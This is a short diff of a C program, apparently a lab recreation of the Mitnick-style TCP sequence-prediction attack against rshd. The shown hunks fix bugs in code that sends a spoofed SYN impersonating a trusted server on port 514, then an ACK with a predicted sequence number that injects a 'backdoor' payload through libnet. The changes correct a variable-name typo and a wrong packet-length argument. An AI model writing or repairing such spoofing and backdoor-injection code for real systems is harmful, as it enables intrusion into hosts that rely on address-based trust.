@@ -221,7 +221,7 @@ int main (void)
 
 	//send syn impersonating the server
 	//as per manpage rshd, port of the client shound be within a range 512-1024 otherwise the connection is reset
-	tcp_seq myseq = send_syn(514, NULL, 0, l, xterm_ip, sever_ip);
+	tcp_seq my_seq = send_syn(514, NULL, 0, l, xterm_ip, server_ip);
 	printf("sent spoofed syn, waiting a second\n");
 	sleep(1);
 	//send ack with predicted seq and inject backdoor
@@ -323,7 +323,7 @@ int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t p
 		2048, 													//window size, random is ok?
 		0,															//checksum, if 0 libnet autofills
 		10,															//urgent pointer
-		LIBNET_TCP_H + payload,					//len = tcp header + size of backdoor
+		LIBNET_TCP_H + payload_s,					//len = tcp header + size of backdoor
 		payload,												//payload backdoor
 		payload_s,											//payload size
 		l,															//pointer to libnet context
